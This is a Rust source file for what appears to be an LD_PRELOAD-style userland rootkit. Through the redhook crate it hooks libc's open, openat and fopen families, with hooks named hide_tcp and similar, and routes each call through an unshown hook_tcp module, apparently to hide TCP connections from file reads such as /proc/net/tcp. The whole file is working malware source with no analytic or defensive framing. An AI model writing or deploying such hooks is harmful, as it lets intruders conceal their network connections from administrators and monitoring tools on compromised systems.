extern crate libc;
use libc::{
    c_char, c_int, SEEK_SET, PATH_MAX
};
use std::{
    ffi::{CStr, CString}, path::PathBuf
};
mod hook_tcp;

redhook::hook! {
    unsafe fn open(cpath: *const c_char, oflag: c_int) -> c_int => hide_tcp {
        hook_tcp::handle_open(cpath, oflag).unwrap_or_else(|| redhook::real!(open)(cpath, oflag))
    }
}

redhook::hook! {
    unsafe fn open64(cpath: *const c_char, oflag: c_int) -> c_int => hide_tcp64 {
        hook_tcp::handle_open(cpath, oflag).unwrap_or_else(|| redhook::real!(open64)(cpath, oflag))
    }
}

redhook::hook! {
    unsafe fn openat(dirfd: c_int, cpath: *const c_char, oflag: c_int) -> c_int => hide_tcp_at {
        hook_tcp::handle_openat(dirfd, cpath, oflag).unwrap_or_else(|| redhook::real!(openat)(dirfd, cpath, oflag))
    }
}

redhook::hook! {
    unsafe fn openat64(dirfd: c_int, cpath: *const c_char, oflag: c_int) -> c_int => hide_tcp_at64 {
        hook_tcp::handle_openat(dirfd, cpath, oflag).unwrap_or_else(|| redhook::real!(openat64)(dirfd, cpath, oflag))
    }
}

redhook::hook! {
    unsafe fn fopen(cpath: *const c_char, mode: *const c_char) -> *mut libc::FILE => hide_tcp_fopen {
        hook_tcp::handle_fopen(cpath, mode).unwrap_or_else(|| redhook::real!(fopen)(cpath, mode))
    }
}

redhook::hook! {
    unsafe fn fopen64(cpath: *const c_char, mode: *const c_char) -> *mut libc::FILE => hide_tcp_fopen64 {
        hook_tcp::handle_fopen(cpath, mode).unwrap_or_else(|| redhook::real!(fopen64)(cpath, mode))
    }
}
